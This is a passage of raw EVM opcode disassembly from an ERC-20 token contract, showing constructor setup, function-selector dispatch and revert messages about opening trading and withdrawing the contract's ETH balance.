0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP2 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST DUP1 MLOAD DUP3 LT ISZERO PUSH3 0x67A JUMPI PUSH1 0x0 DUP2 DUP4 DUP2 MLOAD DUP2 LT PUSH3 0x5FB JUMPI PUSH3 0x5FB PUSH3 0x935 JUMP JUMPDEST PUSH1 0x20 SWAP1 DUP2 MUL SWAP2 SWAP1 SWAP2 ADD DUP2 ADD MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x3 SWAP1 SWAP3 MSTORE PUSH1 0x40 SWAP1 SWAP2 KECCAK256 DUP1 SLOAD PUSH1 0xFF NOT AND PUSH1 0x1 OR SWAP1 SSTORE SWAP1 POP PUSH3 0x63B PUSH1 0x12 PUSH1 0xA PUSH3 0x793 JUMP JUMPDEST PUSH3 0x64B SWAP1 PUSH4 0x1312D00 PUSH3 0x7AB JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x4 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SSTORE DUP3 PUSH3 0x670 DUP2 PUSH3 0x94B JUMP JUMPDEST SWAP4 POP POP POP PUSH3 0x5DA JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x1 DUP2 DUP2 JUMPDEST DUP1 DUP6 GT ISZERO PUSH3 0x6D5 JUMPI DUP2 PUSH1 0x0 NOT DIV DUP3 GT ISZERO PUSH3 0x6B9 JUMPI PUSH3 0x6B9 PUSH3 0x67E JUMP JUMPDEST DUP1 DUP6 AND ISZERO PUSH3 0x6C7 JUMPI SWAP2 DUP2 MUL SWAP2 JUMPDEST SWAP4 DUP5 SHR SWAP4 SWAP1 DUP1 MUL SWAP1 PUSH3 0x699 JUMP JUMPDEST POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH3 0x6EE JUMPI POP PUSH1 0x1 PUSH3 0x78D JUMP JUMPDEST DUP2 PUSH3 0x6FD JUMPI POP PUSH1 0x0 PUSH3 0x78D JUMP JUMPDEST DUP2 PUSH1 0x1 DUP2 EQ PUSH3 0x716 JUMPI PUSH1 0x2 DUP2 EQ PUSH3 0x721 JUMPI PUSH3 0x741 JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP PUSH3 0x78D JUMP JUMPDEST PUSH1 0xFF DUP5 GT ISZERO PUSH3 0x735 JUMPI PUSH3 0x735 PUSH3 0x67E JUMP JUMPDEST POP POP PUSH1 0x1 DUP3 SHL PUSH3 0x78D JUMP JUMPDEST POP PUSH1 0x20 DUP4 LT PUSH2 0x133 DUP4 LT AND PUSH1 0x4E DUP5 LT PUSH1 0xB DUP5 LT AND OR ISZERO PUSH3 0x766 JUMPI POP DUP2 DUP2 EXP PUSH3 0x78D JUMP JUMPDEST PUSH3 0x772 DUP4 DUP4 PUSH3 0x694 JUMP JUMPDEST DUP1 PUSH1 0x0 NOT DIV DUP3 GT ISZERO PUSH3 0x789 JUMPI PUSH3 0x789 PUSH3 0x67E JUMP JUMPDEST MUL SWAP1 POP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x7A4 PUSH1 0xFF DUP5 AND DUP4 PUSH3 0x6DD JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST DUP1 DUP3 MUL DUP2 ISZERO DUP3 DUP3 DIV DUP5 EQ OR PUSH3 0x78D JUMPI PUSH3 0x78D PUSH3 0x67E JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH3 0x7DB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST DUP1 MLOAD PUSH3 0x801 DUP2 PUSH3 0x7C5 JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH3 0x81A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD PUSH3 0x827 DUP2 PUSH3 0x7C5 JUMP JUMPDEST PUSH1 0x20 DUP5 DUP2 ADD MLOAD SWAP2 SWAP4 POP SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x40 SHL SUB DUP1 DUP3 GT ISZERO PUSH3 0x847 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 DUP7 ADD SWAP2 POP DUP7 PUSH1 0x1F DUP4 ADD SLT PUSH3 0x85C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP2 DUP2 GT ISZERO PUSH3 0x871 JUMPI PUSH3 0x871 PUSH3 0x7DE JUMP JUMPDEST DUP1 PUSH1 0x5 SHL PUSH1 0x40 MLOAD PUSH1 0x1F NOT PUSH1 0x3F DUP4 ADD AND DUP2 ADD DUP2 DUP2 LT DUP6 DUP3 GT OR ISZERO PUSH3 0x899 JUMPI PUSH3 0x899 PUSH3 0x7DE JUMP JUMPDEST PUSH1 0x40 MSTORE SWAP2 DUP3 MSTORE DUP5 DUP3 ADD SWAP3 POP DUP4 DUP2 ADD DUP6 ADD SWAP2 DUP10 DUP4 GT ISZERO PUSH3 0x8B8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 DUP6 ADD SWAP4 JUMPDEST DUP3 DUP6 LT ISZERO PUSH3 0x8E1 JUMPI PUSH3 0x8D1 DUP6 PUSH3 0x7F4 JUMP JUMPDEST DUP5 MSTORE SWAP4 DUP6 ADD SWAP4 SWAP3 DUP6 ADD SWAP3 PUSH3 0x8BD JUMP JUMPDEST DUP1 SWAP7 POP POP POP POP POP POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH3 0x904 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH3 0x7A4 DUP2 PUSH3 0x7C5 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH3 0x924 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP1 ISZERO ISZERO DUP2 EQ PUSH3 0x7A4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x1 DUP3 ADD PUSH3 0x960 JUMPI PUSH3 0x960 PUSH3 0x67E JUMP JUMPDEST POP PUSH1 0x1 ADD SWAP1 JUMP JUMPDEST PUSH2 0x18D6 DUP1 PUSH3 0x977 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x12E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7D1DB4A5 GT PUSH2 0xAB JUMPI DUP1 PUSH4 0xA9059CBB GT PUSH2 0x6F JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x313 JUMPI DUP1 PUSH4 0xB70143C9 EQ PUSH2 0x333 JUMPI DUP1 PUSH4 0xBF474BED EQ PUSH2 0x353 JUMPI DUP1 PUSH4 0xC9567BF9 EQ PUSH2 0x369 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x37E JUMPI DUP1 PUSH4 0xE9E1831A EQ PUSH2 0x3C4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH4 0x7D1DB4A5 EQ PUSH2 0x2B5 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x2CB JUMPI DUP1 PUSH4 0x8F9A55C0 EQ PUSH2 0x2E9 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x13A JUMPI DUP1 PUSH4 0x9C7B9B7F EQ PUSH2 0x2FF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH4 0x313CE567 GT PUSH2 0xF2 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x1FF JUMPI DUP1 PUSH4 0x3CCFD60B EQ PUSH2 0x21B JUMPI DUP1 PUSH4 0x49BD5A5E EQ PUSH2 0x232 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x26A JUMPI DUP1 PUSH4 0x715018A6 EQ PUSH2 0x2A0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x13A JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x176 JUMPI DUP1 PUSH4 0xFAEE56F EQ PUSH2 0x1A6 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x1CA JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1DF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLDATASIZE PUSH2 0x135 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x146 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 0x4 DUP2 MSTORE PUSH4 0x151154D5 PUSH1 0xE2 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x16D SWAP2 SWAP1 PUSH2 0x14AE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x182 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x196 PUSH2 0x191 CALLDATASIZE PUSH1 0x4 PUSH2 0x1512 JUMP JUMPDEST PUSH2 0x3CC JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x16D JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1B2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1BC PUSH1 0x12 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x16D JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1D6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1BC PUSH2 0x3E3 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1EB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x196 PUSH2 0x1FA CALLDATASIZE PUSH1 0x4 PUSH2 0x153E JUMP JUMPDEST PUSH2 0x404 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x20B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH1 0x12 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x16D JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x227 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x230 PUSH2 0x46D JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x23E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x14 SLOAD PUSH2 0x252 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x16D JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x276 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1BC PUSH2 0x285 CALLDATASIZE PUSH1 0x4 PUSH2 0x157F JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD SWAP1 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2AC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x230 PUSH2 0x585 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2C1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1BC PUSH1 0xF SLOAD DUP2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2D7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x252 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2F5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1BC PUSH1 0x10 SLOAD DUP2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x30B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLER BALANCE PUSH2 0x1BC JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x31F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x196 PUSH2 0x32E CALLDATASIZE PUSH1 0x4 PUSH2 0x1512 JUMP JUMPDEST PUSH2 0x5F9 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x33F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x230 PUSH2 0x34E CALLDATASIZE PUSH1 0x4 PUSH2 0x159C JUMP JUMPDEST PUSH2 0x606 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x35F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1BC PUSH1 0x11 SLOAD DUP2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x375 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x230 PUSH2 0x68C JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x38A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1BC PUSH2 0x399 CALLDATASIZE PUSH1 0x4 PUSH2 0x15B5 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP4 SWAP1 SWAP5 AND DUP3 MSTORE SWAP2 SWAP1 SWAP2 MSTORE KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH2 0x230 PUSH2 0x72D JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3D9 CALLER DUP5 DUP5 PUSH2 0x830 JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3F1 PUSH1 0x12 PUSH1 0xA PUSH2 0x16E8 JUMP JUMPDEST PUSH2 0x3FF SWAP1 PUSH4 0x3B9ACA00 PUSH2 0x16F7 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x411 DUP5 DUP5 DUP5 PUSH2 0x954 JUMP JUMPDEST PUSH2 0x463 DUP5 CALLER PUSH2 0x45E DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1879 PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP11 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD SWAP2 SWAP1 PUSH2 0x1089 JUMP JUMPDEST PUSH2 0x830 JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0x4A0 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x497 SWAP1 PUSH2 0x170E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x14 SLOAD PUSH1 0x1 PUSH1 0xA0 SHL SWAP1 DIV PUSH1 0xFF AND ISZERO PUSH2 0x4FA JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x54726164696E672068617320616C7265616479206265656E206F70656E656400 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x497 JUMP JUMPDEST SELFBALANCE DUP1 PUSH2 0x548 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1B PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x436F6E747261637420686173206E6F204554482062616C616E63650000000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x497 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 DUP4 ISZERO PUSH2 0x8FC MUL SWAP2 DUP5 SWAP2 DUP2 DUP2 DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x581 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0x5AF JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x497 SWAP1 PUSH2 0x170E JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 SWAP1 DUP4 SWAP1 LOG3 PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND SWAP1 SSTORE JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3D9 CALLER DUP5 DUP5 PUSH2 0x954 JUMP JUMPDEST PUSH1 0x5 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ PUSH2 0x626 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST ADDRESS PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 GT ISZERO DUP1 ISZERO PUSH2 0x645 JUMPI POP PUSH1 0x0 DUP2 GT JUMPDEST PUSH2 0x680 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xC PUSH1 0x24 DUP3 ADD MSTORE PUSH12 0x15DC9BDB99C8185B5BDD5B9D PUSH1 0xA2 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x497 JUMP JUMPDEST PUSH2 0x689 DUP2 PUSH2 0x10C3 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0x6B6 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x497 SWAP1 PUSH2 0x170E JUMP JUMPDEST PUSH1 0x14 SLOAD PUSH1 0x1 PUSH1 0xA0 SHL SWAP1 DIV PUSH1 0xFF AND ISZERO PUSH2 0x710 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x17 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x54726164696E6720697320616C7265616479206F70656E000000000000000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x497 JUMP JUMPDEST PUSH1 0x14 DUP1 SLOAD PUSH3 0xFF00FF PUSH1 0xA0 SHL NOT AND PUSH3 0x10001 PUSH1 0xA0 SHL OR SWAP1 SSTORE NUMBER PUSH1 0x6 SSTORE JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0x757 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x497 SWAP1 PUSH2 0x170E JUMP JUMPDEST PUSH1 0x13 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xF305D719 CALLVALUE ADDRESS PUSH2 0x789 DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x79E PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0xE0 DUP9 SWAP1 SHL PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB NOT AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP6 DUP7 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP2 ADD SWAP5 SWAP1 SWAP5 MSTORE PUSH1 0x44 DUP5 ADD SWAP3 SWAP1 SWAP3 MSTORE PUSH1 0x64 DUP4 ADD MSTORE SWAP1 SWAP2 AND PUSH1 0x84 DUP3 ADD MSTORE TIMESTAMP PUSH1 0xA4 DUP3 ADD MSTORE PUSH1 0xC4 ADD PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x806 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x82B SWAP2 SWAP1 PUSH2 0x1743 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x892 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP1 DUP3 ADD MSTORE PUSH32 0x45524332303A20617070726F76652066726F6D20746865207A65726F20616464 PUSH1 0x44 DUP3 ADD MSTORE PUSH4 0x72657373 PUSH1 0xE0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x497 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0x8F3 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x22 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A20617070726F766520746F20746865207A65726F206164647265 PUSH1 0x44 DUP3 ADD MSTORE PUSH2 0x7373 PUSH1 0xF0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x497 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 DUP2 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE SWAP1 MLOAD DUP5 DUP2 MSTORE PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP2 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x9B8 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x25 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E736665722066726F6D20746865207A65726F206164 PUSH1 0x44 DUP3 ADD MSTORE PUSH5 0x6472657373 PUSH1 0xD8 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x497 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0xA1A JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x23 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E7366657220746F20746865207A65726F2061646472 PUSH1 0x44 DUP3 ADD MSTORE PUSH3 0x657373 PUSH1 0xE8 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x497 JUMP JUMPDEST PUSH1 0x0 DUP2 GT PUSH2 0xA7C JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x29 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x5472616E7366657220616D6F756E74206D757374206265206772656174657220 PUSH1 0x44 DUP3 ADD MSTORE PUSH9 0x7468616E207A65726F PUSH1 0xB8 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x497 JUMP JUMPDEST PUSH1 0x14 SLOAD PUSH1 0x1 PUSH1 0xA0 SHL SWAP1 DIV PUSH1 0xFF AND PUSH2 0xAEA JUMPI PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 DUP2 AND SWAP2 AND EQ PUSH2 0xAEA JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x17 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x54726164696E67206E6F7420656E61626C656420796574000000000000000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x497 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x6 SLOAD GT DUP1 ISZERO 